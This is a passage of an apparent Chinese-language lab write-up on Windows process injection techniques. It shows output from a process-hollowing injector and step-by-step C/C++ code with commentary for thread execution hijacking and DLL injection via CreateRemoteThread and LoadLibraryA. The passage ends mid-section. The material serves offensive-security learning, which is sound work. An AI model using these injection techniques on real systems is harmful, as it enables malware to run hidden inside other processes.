+<pre><code class="hljs powershell"> <span class="hljs-built_in">PS</span> C:\Users\THM<span class="hljs-literal">-Attacker</span>&gt;.\Desktop\Injectors\hollowing<span class="hljs-literal">-injector</span>.exe <span class="hljs-number">2864</span>
+ [+] Created victim <span class="hljs-keyword">process</span>
+        [*] PID <span class="hljs-number">3652</span>
+[+] Replacement executable opened
+        [*] Size <span class="hljs-number">103424</span> bytes
+[+] Read replacement executable into memory
+        [*] <span class="hljs-keyword">In</span> current <span class="hljs-keyword">process</span> at <span class="hljs-number">0</span>x001a0000
+[+] Obtained context from victim <span class="hljs-keyword">process</span><span class="hljs-string">'s primary thread</span>
+<span class="hljs-string">        [*] Victim PEB address / EBX = 0x032bf000</span>
+<span class="hljs-string">        [*] Victim entry point / EAX = 0x010936d0</span>
+<span class="hljs-string">[+] Extracted image base address of victim process</span>
+<span class="hljs-string">        [*] Address: 0x01090000</span>
+<span class="hljs-string">[+] Hollowed out victim executable via NtUnmapViewOfSection</span>
+<span class="hljs-string">        [*] Utilized base address of 0x01090000</span>
+<span class="hljs-string">[+] Replacement image metadata extracted</span>
+<span class="hljs-string">        [*] replacementImageBaseAddress = 0x00400000</span>
+<span class="hljs-string">        [*] Replacement process entry point = 0x00001268</span>
+<span class="hljs-string">[+] Allocated memory in victim process</span>
+<span class="hljs-string">        [*] pVictimHollowedAllocation = 0x01090000</span>
+<span class="hljs-string">        [*] Headers written into victim process</span>
+<span class="hljs-string">        [*] Section .text written into victim process at 0x01091000</span>
+<span class="hljs-string">                [*] Replacement section header virtual address: 0x00001000</span>
+<span class="hljs-string">                [*] Replacement section header pointer to raw data: 0x00000400</span>
+<span class="hljs-string">        [*] Section .rdata written into victim process at 0x01092000</span>
+<span class="hljs-string">                [*] Replacement section header virtual address: 0x00002000</span>
+<span class="hljs-string">                [*] Replacement section header pointer to raw data: 0x00001200</span>
+<span class="hljs-string">        [*] Section .data written into victim process at 0x01093000</span>
+<span class="hljs-string">                [*] Replacement section header virtual address: 0x00003000</span>
+<span class="hljs-string">                [*] Replacement section header pointer to raw data: 0x00001e00</span>
+<span class="hljs-string">        [*] Section .rsrc written into victim process at 0x01094000</span>
+<span class="hljs-string">                [*] Replacement section header virtual address: 0x00004000</span>
+<span class="hljs-string">                [*] Replacement section header pointer to raw data: 0x00002000</span>
+<span class="hljs-string">        [*] Section .reloc written into victim process at 0x010ac000</span>
+<span class="hljs-string">                [*] Replacement section header virtual address: 0x0001c000</span>
+<span class="hljs-string">                [*] Replacement section header pointer to raw data: 0x00019200</span>
+<span class="hljs-string">[+] Victim process entry point set to replacement image entry point in EAX register</span>
+<span class="hljs-string">        [*] Value is 0x01091268</span>
+<span class="hljs-string">[+] Resuming victim process primary thread...</span>
+<span class="hljs-string">[+] Cleaning up</span></code></pre>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605527.png" alt></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605528.png" alt></p>
+<h1 id="0x04-滥用进程组件线程执行劫持">0x04 滥用进程组件(线程执行劫持)</h1>
+<p>概括性地说，线程(执行)劫持可以分为以下十个步骤：</p>
+<ol>
+<li>找到并打开要控制的目标进程；</li>
+<li>在目标进程中为恶意代码分配内存区域；</li>
+<li>将恶意代码写入已分配的内存中；</li>
+<li>确认要劫持的目标线程的线程ID；</li>
+<li>打开目标线程；</li>
+<li>挂起目标线程；</li>
+<li>获取线程的上下文；</li>
+<li>更新指令指针(Instruction Pointer)以指向恶意代码；</li>
+<li>重写目标线程上下文;</li>
+<li>恢复被劫持的线程。</li>
+</ol>
+<p>接下来我们将分解一个基本的线程劫持脚本来认识线程劫持的每个步骤，并在下面进行更深入地解释。</p>
+<p>该技术的前三个步骤将遵循与正常的进程注入类似的常见操作，我们在本节中不作过多的解释(参考上文内容即可)，相关源代码如下所示：</p>
+<pre><code class="hljs c#"><span class="hljs-comment">//找到并打开要控制的目标进程</span>
+HANDLE hProcess = OpenProcess(
+	PROCESS_ALL_ACCESS, <span class="hljs-comment">// Requests all possible access rights 请求所有可能的访问权限</span>
+	FALSE, <span class="hljs-comment">// Child processes do not inheret parent process handle 子进程不继承父进程句柄</span>
+	processId <span class="hljs-comment">// Stored process ID 已存储的进程ID</span>
+);
+
+<span class="hljs-comment">//为恶意代码分配内存区域</span>
+PVOIF remoteBuffer = VirtualAllocEx(
+	hProcess, <span class="hljs-comment">// Opened target process 表示被打开的目标进程，即目标进程的句柄</span>
+	NULL, 
+	<span class="hljs-keyword">sizeof</span> shellcode, <span class="hljs-comment">// Region size of memory allocation 内存分配的区域大小</span>
+	(MEM_RESERVE | MEM_COMMIT), <span class="hljs-comment">// Reserves and commits pages 保留和提交内存页面</span>
+	PAGE_EXECUTE_READWRITE <span class="hljs-comment">// Enables execution and read/write access to the commited pages 启用对已提交内存页面的执行和读/写访问权限</span>
+);
+
+<span class="hljs-comment">//将恶意代码写入已分配的内存</span>
+WriteProcessMemory(
+	processHandle, <span class="hljs-comment">// Opened target process 被打开的目标进程</span>
+	remoteBuffer, <span class="hljs-comment">// Allocated memory region 已分配的内存区域</span>
+	shellcode, <span class="hljs-comment">// Data to write 要写入的数据</span>
+	<span class="hljs-keyword">sizeof</span> shellcode, <span class="hljs-comment">// byte size of data 要写入的数据的大小</span>
+	NULL
+);</code></pre>
+<p>在完成与上述代码段相关的步骤并且我们的shellcode也已经被写入到指定内存后，我们就可以进入线程劫持的第四步，在第四步中，我们需要通过确认线程ID以开始劫持目标进程的线程。</p>
+<p>为了确认目标线程ID，我们需要使用三个Windows API调用：<code>CreateToolhelp32Snapshot()</code>、<code>Thread32First()</code>和<code>Thread32Next()</code>。这些API调用将共同地循环遍历线程快照并能实现枚举线程的功能。</p>
+<p>tips：请查看Windows官方相关文档，以便更好地理解此处的三个API调用。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">https://learn.microsoft.com/zh-cn/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot</a></li>
+<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first">https://learn.microsoft.com/zh-cn/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first</a></li>
+<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next">https://learn.microsoft.com/zh-cn/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next</a></li>
+</ul>
+<pre><code class="hljs c#">THREADENTRY32 threadEntry; <span class="hljs-comment">//定义一个THREADENTRY32结构体变量，用于存储线程的信息</span>
+
+HANDLE hSnapshot = CreateToolhelp32Snapshot( <span class="hljs-comment">//为指定的进程/线程创建快照</span>
+	TH32CS_SNAPTHREAD, <span class="hljs-comment">//在快照中包含驻留在系统中的所有线程</span>
+	<span class="hljs-number">0</span> <span class="hljs-comment">// Indicates the current process 要包含在快照中的进程的进程标识符，为零时指示当前进程</span>
+);
+Thread32First( <span class="hljs-comment">// Obtains the first thread in the snapshot 获取快照中的第一个线程</span>
+	hSnapshot, <span class="hljs-comment">// Handle of the snapshot 快照句柄</span>
+	&amp;threadEntry <span class="hljs-comment">// Pointer to the THREADENTRY32 structure 指向THREADENTRY32结构的指针，用于存储第一个线程的信息</span>
+);
+
+<span class="hljs-keyword">while</span> (Thread32Next( <span class="hljs-comment">// Obtains the next thread in the snapshot 获取快照中的下一个线程</span>
+	hsnapshot, <span class="hljs-comment">// Handle of the snapshot 快照句柄</span>
+	&amp;threadEntry <span class="hljs-comment">// Pointer to the THREADENTRY32 structure 指向THREADENTRY32结构的指针，用于存储下一个线程的信息</span>
+))
+
+
+<span class="hljs-comment">//这段代码使用了Windows API 中的进程和线程遍历函数，主要目的是获取系统中所有线程的信息，以下是代码的分析：</span>
+
+<span class="hljs-comment">//1. `THREADENTRY32 threadEntry;`：定义了一个名为 `threadEntry` 的 THREADENTRY32 结构体，用于存储线程信息。</span>
+
+<span class="hljs-comment">//2. `HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);`：创建一个包含进程/线程的快照。`CreateToolhelp32Snapshot`是一个用于获取系统信息的函数，此处使用`TH32CS_SNAPTHREAD`参数表示获取系统中所有线程的快照，而 0 表示获取当前进程的快照。</span>
+
+<span class="hljs-comment">//3. `Thread32First(hSnapshot, &amp;threadEntry);`：通过 `Thread32First` 函数获取第一个线程的信息。该函数将填充传递给它的 THREADENTRY32 结构体，即 `threadEntry`。</span>
+
+<span class="hljs-comment">//4. `while (Thread32Next(snapshot, &amp;threadEntry))`：通过 `Thread32Next` 函数在快照中获取下一个线程的信息，该循环会一直执行，直到没有更多的线程信息可用。</span></code></pre>
+<p>接下来是线程劫持的第五步，我们已经在结构体指针中收集了所有需要的信息，现在可以打开目标线程了，为此，我们将使用<code>OpenThread</code>来处理我们用于存储线程信息的THREADENTRY32结构体指针。</p>
+<pre><code class="hljs c#"><span class="hljs-keyword">if</span> (threadEntry.th32OwnerProcessID == processID) <span class="hljs-comment">// Verifies both parent process ID's match 验证两个父进程ID是否匹配</span>
+		{
+			HANDLE hThread = OpenThread(  <span class="hljs-comment">// 如果找到符合条件的线程，则打开该线程的句柄</span>
+				THREAD_ALL_ACCESS, <span class="hljs-comment">// Requests all possible access rights 请求所有可能的访问权限</span>
+				FALSE, <span class="hljs-comment">// Child threads do not inheret parent thread handle 子线程不继承父线程的句柄</span>
+				threadEntry.th32ThreadID <span class="hljs-comment">// 从THREADENTRY32结构体指针中读取线程ID</span>
+			);
+			<span class="hljs-keyword">break</span>; <span class="hljs-comment">// 中断循环，不再继续遍历其他线程</span>
+		}
+<span class="hljs-comment">//这段代码的目的是根据给定的进程ID（`processID`），查找具有相同父进程ID的线程，并打开该线程的句柄。</span>
+
+<span class="hljs-comment">//具体分析如下：</span>
+
+<span class="hljs-comment">//1. `if (threadEntry.th32OwnerProcessID == processID)`：通过比较`threadEntry`结构体中的线程拥有者的进程ID（`th32OwnerProcessID`）和给定的进程ID（`processID`）是否匹配来判断是否找到了目标线程；这个条件确保了只有当某个线程的父进程ID匹配到给定的进程ID时，才会执行后续的操作。</span>
+
+<span class="hljs-comment">//2. `HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);`：如果找到了符合条件的线程，就使用 `OpenThread` 函数来打开该线程的句柄，这个函数的参数包括：</span>
+<span class="hljs-comment">//  - `THREAD_ALL_ACCESS`：请求对线程的所有可能的访问权限。</span>
+<span class="hljs-comment">//  - `FALSE`：表示子线程不继承父线程的句柄。</span>
+<span class="hljs-comment">//  - `threadEntry.th32ThreadID`：从 `THREADENTRY32` 结构体中获取线程ID。</span>
+
+<span class="hljs-comment">//3. `break;`：找到符合条件的线程后，中断循环，不再继续遍历其他线程。</span>
+
+<span class="hljs-comment">//总体而言，这段代码的作用是在系统中查找具有指定父进程ID的线程，并打开找到的第一个匹配的线程的句柄。</span></code></pre>
+<p>在线程劫持的第六步中，我们必须挂起打开的目标线程，要挂起目标线程，我们可以使用<code>SuspendThread</code>。</p>
+<pre><code class="hljs c#">SuspendThread(hThread);<span class="hljs-comment">//使目标线程进入暂停状态，停止执行目标线程中的指令。</span></code></pre>
+<p>在线程劫持的第七步中，我们需要获取目标线程的上下文信息以便在即将进行的 API 调用中使用，这可以通过使用<code>GetThreadContext</code>并存储指针来完成。</p>
+<pre><code class="hljs c#">CONTEXT context;
+GetThreadContext(
+	hThread, <span class="hljs-comment">// Handle for the thread 目标线程的句柄</span>
+	&amp;context <span class="hljs-comment">// Pointer to store the context structure 指向存储上下文结构的指针</span>
+);
+
+<span class="hljs-comment">//这段代码使用了Windows API函数 `GetThreadContext` 来获取指定线程的上下文信息，以下是对这段代码的分析：</span>
+
+<span class="hljs-comment">//1. `CONTEXT context;`：定义了一个`CONTEXT`结构体变量，用于存储线程的上下文信息，`CONTEXT` 结构体包含了关于线程状态的各种信息，例如寄存器值、标志位等。</span>
+
+<span class="hljs-comment">//2. `GetThreadContext(hThread, &amp;context);`：调用了`GetThreadContext`函数，该函数的目的是获取指定线程的上下文信息，具体参数如下：</span>
+<span class="hljs-comment">//   - `hThread`：这是一个 `HANDLE` 类型的变量，表示目标线程的句柄。</span>
+<span class="hljs-comment">//   - `&amp;context`：这是一个指向 `CONTEXT` 结构体的指针，用于存储获取到的线程上下文信息。</span>
+
+<span class="hljs-comment">//通过调用`GetThreadContext`，可以获取目标线程的当前状态，包括寄存器的值、标志位等信息；这在某些情况下，比如线程调试、异常处理等场景中是非常有用的，获取线程上下文信息通常是为了进一步分析线程的状态，诊断问题或实现特定的功能。</span></code></pre>
+<p>在线程劫持的第八步中，我们需要覆写RIP（指令指针寄存器）以指向我们的恶意内存区域，RIP是一个x64寄存器，它将确定下一条代码指令，简而言之，它控制着内存中应用程序的流程，为了覆写此寄存器，我们可以更新目标线程上下文中的RIP信息。</p>
+<p>tips：RIP - Instruction Pointer Register</p>
+<pre><code class="hljs c#">context.Rip = (DWORD_PTR)remoteBuffer; <span class="hljs-comment">// Points RIP to our malicious buffer allocation 将RIP指向我们为恶意代码分配的内存区域</span>
+
+<span class="hljs-comment">//这段代码的目的是将线程的指令指针寄存器(RIP)设置为一个特定的内存地址，即将其指向一个为恶意代码分配的缓冲区（`remoteBuffer`）。</span>
+
+<span class="hljs-comment">//具体分析如下：</span>
+
+<span class="hljs-comment">//1. `context.Rip = (DWORD_PTR)remoteBuffer;`：这行代码将`context`结构体中的成员`Rip`(即指令指针寄存器)的值设置为`(DWORD_PTR)remoteBuffer`，这样做的效果是将线程的执行流指向了 `remoteBuffer` 所代表的内存地址。</span>
+
+<span class="hljs-comment">//2. `(DWORD_PTR)remoteBuffer`：将 `remoteBuffer` 的地址转换为 `DWORD_PTR` 类型，从而确保结构体成员 `Rip`所接受的是一个合适的地址值。</span></code></pre>
+<p>接下来是线程劫持的第九步，我们需要将当前上下文更新为目标线程的上下文，使用<code>SetThreadContext</code>和上下文指针可以轻松完成此操作。</p>
+<pre><code class="hljs c#">SetThreadContext(
+	hThread, <span class="hljs-comment">// Handle for the thread 目标线程的句柄</span>
+	&amp;context <span class="hljs-comment">// Pointer to the context structure 指向上下文结构的指针</span>
+);</code></pre>
+<p>最后是线程劫持的第十步，我们需要让目标线程脱离挂起状态，这可以通过使用<code>ResumeThread</code>来完成。</p>
+<pre><code class="hljs c#">ResumeThread(
+	hThread <span class="hljs-comment">// Handle for the thread 目标线程的句柄</span>
+);</code></pre>
+<p>我们可以将上述这些步骤编译在一起，以创建一个通过线程劫持来完成注入的进程注入器，并使用由本文实验环境所提供的C++注入器来尝试进行线程劫持实验。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605529.png" alt></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605530.png" alt></p>
+<h1 id="0x05-滥用dlls动态链接库注入">0x05 滥用DLLs(动态链接库注入)</h1>
+<p>可参考文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/559158416?utm_id=0">https://zhuanlan.zhihu.com/p/559158416?utm_id=0</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43781139/article/details/106189664">https://blog.csdn.net/weixin_43781139/article/details/106189664</a></li>
+</ul>
+<p>概括性地说，DLL注入可以分为以下五个步骤：</p>
+<ol>
+<li>Locate a target process to inject：找到要注入的目标进程。</li>
+<li>Open the target process：打开目标进程。</li>
+<li>Allocate memory region for malicious DLL：在进程中为恶意DLL的路径分配内存区域。</li>
+<li>Write the malicious DLL to allocated memory：将恶意DLL的路径写入已分配的内存中。</li>
+<li>Load and execute the malicious DLL：加载并执行恶意DLL。</li>
+</ol>
+<p>刚才提到的五个步骤描述了基本的DLL注入过程，以下是对每个步骤的简要解释：</p>
+<ol>
+<li>
+<p>寻找要注入的目标进程：这可能涉及到获取目标进程的PID（进程标识符）或根据进程名称定位目标进程。</p>
+</li>
+<li>
+<p>打开目标进程：使用相关的API函数（例如&nbsp;<code>OpenProcess</code>）来获取目标进程的句柄，以便后续的操作。</p>
+</li>
+<li>
+<p>为恶意DLL的路径分配内存区域：使用&nbsp;<code>VirtualAllocEx</code>&nbsp;或类似的函数在目标进程的虚拟地址空间中分配内存。</p>
+</li>
+<li>
+<p>将恶意DLL的路径写入分配的内存：使用&nbsp;<code>WriteProcessMemory</code>&nbsp;将恶意DLL的路径写入到先前已经分配好的内存区域。</p>
+</li>
+<li>
+<p>加载并执行恶意DLL：通过调用<code>LoadLibrary</code>&nbsp;或类似的函数加载恶意DLL，并开始执行其中的代码。</p>
+</li>
+</ol>
+<p>接下来我们将分解一个基本的DLL注入器来认识上述每个步骤，并在下面进行更深入地解释。</p>
+<p>在DLL注入的第一步中，我们将使用三个Windows API调用来定位进程：<code>CreateToolhelp32Snapshot()</code>、<code>Process32First()</code>和<code>Process32Next()</code>。</p>
+<pre><code class="hljs c#"><span class="hljs-function">DWORD <span class="hljs-title">getProcessId</span>(<span class="hljs-params"><span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> *processName</span>)</span> {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot( <span class="hljs-comment">// Snapshot the specificed process 为指定的进程/线程创建快照</span>
+			TH32CS_SNAPPROCESS, <span class="hljs-comment">// Include all processes residing on the system 在快照中包含系统中的所有进程</span>
+			<span class="hljs-number">0</span> <span class="hljs-comment">// Indicates the current process 要包含在快照中的进程的进程标识符，该参数可以为零以指示当前进程</span>
+		);
+    <span class="hljs-keyword">if</span> (hSnapshot) {
+        PROCESSENTRY32 entry; <span class="hljs-comment">// Adds a pointer to the PROCESSENTRY32 structure 添加一个指向 PROCESSENTRY32 结构的指针(&amp;entry)</span>
+        entry.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32); <span class="hljs-comment">// Obtains the byte size of the structure 获取结构的字节大小</span>
+        <span class="hljs-keyword">if</span> (Process32First( <span class="hljs-comment">// Obtains the first process in the snapshot 获取快照中的第一个进程</span>
+					hSnapshot, <span class="hljs-comment">// Handle of the snapshot 快照句柄</span>
+					&amp;entry <span class="hljs-comment">// Pointer to the PROCESSENTRY32 structure 指向PROCESSENTRY32结构的指针</span>
+				)) {
+            <span class="hljs-keyword">do</span> {
+                <span class="hljs-keyword">if</span> (!strcmp( <span class="hljs-comment">// Compares two strings to determine if the process name matches 比较两个字符串以确定进程名称是否匹配</span>
+									entry.szExeFile, <span class="hljs-comment">// PROCESSENTRY32中当前进程的可执行文件名</span>
+									processName <span class="hljs-comment">// Supplied process name 被提供的进程名称</span>
+								)) { 
+                    <span class="hljs-keyword">return</span> entry.th32ProcessID; <span class="hljs-comment">// Process ID of matched process 已成功匹配的进程的进程ID</span>
+                }
+            } <span class="hljs-keyword">while</span> (Process32Next( <span class="hljs-comment">// Obtains the next process in the snapshot 获取快照中的下一个进程</span>
+							hSnapshot, <span class="hljs-comment">// Handle of the snapshot 快照句柄</span>
+							&amp;entry <span class="hljs-comment">// Pointer to the PROCESSENTRY32 structure 指向 PROCESSENTRY32 结构的指针</span>
+						)); 
+        }
+    }
+
+DWORD processId = getProcessId(processName); <span class="hljs-comment">// Stores the enumerated process ID 存储经过进程枚举之后得到的进程ID</span>
+
+<span class="hljs-comment">//这段代码的功能是通过进程名称查找对应进程的进程ID，以下是对代码段的分析：</span>
+
+<span class="hljs-comment">//1. `HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);`：创建一个包含进程的快照。`CreateToolhelp32Snapshot`是一个用于获取系统信息的函数，此处使用`TH32CS_SNAPPROCESS`参数表示获取系统中所有进程的快照，而 0 表示获取当前进程的快照。</span>
+
+<span class="hljs-comment">//2. `if (hSnapshot)`：检查是否成功创建了进程快照。</span>
+
+<span class="hljs-comment">//3. `PROCESSENTRY32 entry;`：定义了一个`PROCESSENTRY32`结构体变量，用于存储进程信息。</span>
+
+<span class="hljs-comment">//4. `entry.dwSize = sizeof(PROCESSENTRY32);`：设置`PROCESSENTRY32`结构体的大小。</span>
+
+<span class="hljs-comment">//5. `if (Process32First(hSnapshot, &amp;entry)){...}`：使用`Process32First`函数获取第一个进程的信息，如果成功获取，则进入`do-while`循环。</span>
+
+<span class="hljs-comment">//6. `if (!strcmp(entry.szExeFile, processName)) { return entry.th32ProcessID; }`：在循环中，比较当前进程的可执行文件名（`szExeFile`）与给定的进程名字（`processName`）；如果匹配成功，则返回该进程的进程ID（`th32ProcessID`）。</span>
+
+<span class="hljs-comment">//7. `while (Process32Next(hSnapshot, &amp;entry));`：使用`Process32Next`函数获取快照中的下一个进程的信息，然后循环继续直到没有更多的进程。</span>
+
+<span class="hljs-comment">//8. `DWORD processId = getProcessId(processName);`：调用刚才的`getProcessId`函数以获取指定进程名字的进程ID，并将其存储在`processId`变量中。</span>
+
+<span class="hljs-comment">//总体而言，这段代码将通过遍历系统中的进程列表来查找指定名字的进程，并返回该进程的进程ID。</span></code></pre>
+<p>接下来是DLL注入的第二步，在成功枚举PID后，我们需要打开进程，这可以通过使用各种Windows API调用来完成：<code>GetModuleHandle</code>、<code>GetProcAddress</code>或<code>OpenProcess</code>。</p>
+<pre><code class="hljs c#">HANDLE hProcess = OpenProcess( <span class="hljs-comment">//打开目标进程</span>
+	PROCESS_ALL_ACCESS, <span class="hljs-comment">// Requests all possible access rights 请求对进程具有所有可能的访问权限</span>
+	FALSE, <span class="hljs-comment">// Child processes do not inheret parent process handle 表示子进程不继承父进程句柄，子进程通常不需要继承父进程的句柄</span>
+	processId <span class="hljs-comment">// Stored process ID 已存储的进程ID</span>
+);</code></pre>
+<p>在DLL注入的第三步中，我们必须在目标进程中为恶意DLL的路径分配内存以供其驻留，与大多数注入器一样，这可以通过使用<code>VirtualAllocEx</code>来完成。</p>
+<pre><code class="hljs c#">LPVOID dllAllocatedMemory = VirtualAllocEx( <span class="hljs-comment">//dllAllocatedMemory将包含已分配的内存的基地址，后续可以将DLL路径写入这块内存，并在进程中加载该DLL</span>
+	hProcess, <span class="hljs-comment">// Handle for the target process 目标进程的句柄</span>
+	NULL, <span class="hljs-comment">//表示让系统决定内存分配的基地址</span>
+	strlen(dllLibFullPath), <span class="hljs-comment">// Size of the DLL path DLL路径的大小</span>
+	MEM_RESERVE | MEM_COMMIT, <span class="hljs-comment">// Reserves and commits pages 保留和提交内存页面，MEM_RESERVE用于保留虚拟地址空间，MEM_COMMIT用于提交物理内存。</span>
+	PAGE_EXECUTE_READWRITE <span class="hljs-comment">// Enables execution and read/write access to the commited pages 启用对已提交内存页面的执行和读/写访问权限</span>
+);</code></pre>
+<p>在DLL注入的第四步中，我们需要将恶意DLL的路径写入已分配的内存位置，我们可以使用<code>WriteProcessMemory</code>来将数据写入已分配的内存区域中。</p>
+<pre><code class="hljs c#">WriteProcessMemory(
+	hProcess, <span class="hljs-comment">//目标进程的句柄</span>
+	dllAllocatedMemory, <span class="hljs-comment">//已经分配好的内存区域，dllAllocatedMemory是之前通过VirtualAllocEx分配的内存空间的基地址</span>
+	dllLibFullPath, <span class="hljs-comment">//恶意DLL的路径</span>
+	strlen(dllLibFullPath) + <span class="hljs-number">1</span>, <span class="hljs-comment">//表示要写入的数据的字节数，包括字符串末尾的null终止符，这将确保整个字符串被写入到目标进程的内存中</span>
+	NULL <span class="hljs-comment">//表示不使用任何特殊的标志</span>
+);</code></pre>
+<p>最后是DLL注入的第五步，在恶意DLL的路径被写入内存之后，我们要做的就是加载并执行它。我们需要先导入<code>LoadLibrary</code>(从kernel32导入)，一旦导入完成，我们就可以通过在<code>CreateRemoteThread</code>函数中指定<code>LoadLibrary</code>作为启动函数来加载指定路径的恶意DLL，完成加载后，目标进程将自行执行恶意DLL。</p>
+<pre><code class="hljs c#">LPVOID loadLibrary = (LPVOID) GetProcAddress(
+	GetModuleHandle(<span class="hljs-string">"kernel32.dll"</span>), <span class="hljs-comment">// Handle of the module containing the call 包含调用的模块的句柄</span>
+	<span class="hljs-string">"LoadLibraryA"</span> <span class="hljs-comment">// API call to import 导入API调用</span>
+);
+HANDLE remoteThreadHandler = CreateRemoteThread(<span class="hljs-comment">//加载指定路径的恶意DLL</span>
+	hProcess, <span class="hljs-comment">//目标进程的句柄</span>
+	NULL, 
+	<span class="hljs-number">0</span>, <span class="hljs-comment">// Default size from the execuatable of the stack 堆栈在可执行文件中的默认大小</span>
+	(LPTHREAD_START_ROUTINE) loadLibrary, <span class="hljs-comment">//pointer to the starting function 指向起始函数的指针</span>
+	dllAllocatedMemory, <span class="hljs-comment">//指向已分配内存区域的指针，该内存区域包含了先前写入的DLL路径</span>
+	<span class="hljs-number">0</span>, <span class="hljs-comment">// Runs immediately after creation 创建后立即运行</span>
+	NULL
+);
+
+<span class="hljs-comment">//关于CreateRemoteThread的定义：</span>
+<span class="hljs-comment">//HANDLE CreateRemoteThread(</span>
+<span class="hljs-comment">//  HANDLE                 hProcess,	//要在其中创建线程的进程的句柄</span>
+<span class="hljs-comment">//  LPSECURITY_ATTRIBUTES  lpThreadAttributes,	//线程的安全属性，为新线程指定安全描述符</span>
+<span class="hljs-comment">//  SIZE_T                 dwStackSize,		//线程栈的大小，堆栈的初始大小，以字节为单位</span>
+<span class="hljs-comment">//  LPTHREAD_START_ROUTINE lpStartAddress,	//该指针表示远程进程中线程的起始地址</span>
+<span class="hljs-comment">//  LPVOID                 lpParameter,	//指向要传递给线程函数的参数变量的指针</span>
+<span class="hljs-comment">//  DWORD                  dwCreationFlags,	//控制线程创建的标志</span>
+<span class="hljs-comment">//  LPDWORD                lpThreadId	//指向接收线程标识符的变量的指针</span>
+<span class="hljs-comment">//);</span>
+<span class="hljs-comment">//</span>
+
+
+<span class="hljs-comment">//上面这段代码主要用于在目标进程中创建一个远程线程，并在该线程中调用 LoadLibraryA 函数，从而加载先前写入的恶意DLL，以下是对代码的分析：</span>
+   
+<span class="hljs-comment">//GetProcAddress函数用于获取指定模块（这里是 kernel32.dll）中导出函数的地址，在这里，它获取了LoadLibraryA函数的地址，并将其强制转换为LPVOID类型。</span>
+
+<span class="hljs-comment">//CreateRemoteThread 函数用于在目标进程中创建一个新的线程，该函数的参数包括：</span>
+<span class="hljs-comment">//hProcess：目标进程的句柄。</span>
+<span class="hljs-comment">//NULL：使用默认的安全性描述符。</span>
+<span class="hljs-comment">//0：使用默认的堆栈大小。</span>
+<span class="hljs-comment">//(LPTHREAD_START_ROUTINE) loadLibrary：指向线程起始函数的指针，这里的值是LoadLibraryA函数的地址。</span>
+<span class="hljs-comment">//dllAllocatedMemory：指向已分配内存区域的指针，该内存区域包含了先前写入的恶意DLL的路径。</span>
+<span class="hljs-comment">//0：创建线程后立即运行。</span>
+<span class="hljs-comment">//NULL：新线程的标识符。</span>
+
+<span class="hljs-comment">//关于恶意DLL的加载：</span>
+<span class="hljs-comment">//上述代码使用CreateRemoteThread在目标进程中创建一个新线程，新线程的起始函数是LoadLibraryA，函数参数为dllAllocatedMemory；当新线程运行时，它就会调用LoadLibraryA(dllAllocatedMemory)，其中dllAllocatedMemory是指向已分配内存区域的指针，而该内存区域包含了先前写入的恶意DLL的路径；这样就可以通过调用LoadLibraryA函数在目标进程中加载指定路径的恶意DLL。</span>
+
+<span class="hljs-comment">//关于恶意DLL的执行：</span>
+<span class="hljs-comment">//LoadLibraryA函数被调用后，会在目标进程的虚拟空间中加载指定路径的恶意DLL，但这一步并没有直接将恶意DLL的内容写入到目标进程的虚拟空间，而是创建了恶意DLL的内存映射，将恶意DLL的代码和数据映射到目标进程的地址空间中，从而使得恶意DLL的代码可以在目标进程中执行。</span>
+
+<span class="hljs-comment">//这种方式实际上是一种“外部”注入，即通过指定的DLL路径实现恶意DLL的加载，而不是直接将恶意DLL的二进制内容写入到目标进程的内存空间；实际的恶意DLL的二进制内容是在LoadLibraryA函数被调用时，系统动态地从DLL文件中读取并映射到目标进程的。</span>
+
+<span class="hljs-comment">//关于写入和映射的区别：</span>
+<span class="hljs-comment">//写入和映射的区别在于操作的对象和目的，写入是将数据从一个地方复制到另一个地方，而映射是将文件或内存段映射到内存中的一部分；选择写入还是映射取决于具体的使用场景和需求，对于小型数据，写入可能足够高效，而对于大型数据块，映射通常更为有效。</span>
+
+<span class="hljs-comment">//在上述注入的代码中，我们没有显式地为DLL的二进制内容分配空间，而是依赖于LoadLibraryA函数的加载机制。这是因为LoadLibraryA本身会负责在目标进程中分配并映射 DLL的代码和数据所需的虚拟空间，我们在上述注入过程中主要关注的是传递DLL路径的过程，而具体的DLL内容加载则由LoadLibraryA处理。</span></code></pre>
+<p>我们可以将上述这些步骤编译在一起，以创建一个DLL注入器，并使用由本文实验环境所提供的C++注入器来尝试进行DLL注入实验。</p>
+<p>tips：</p>
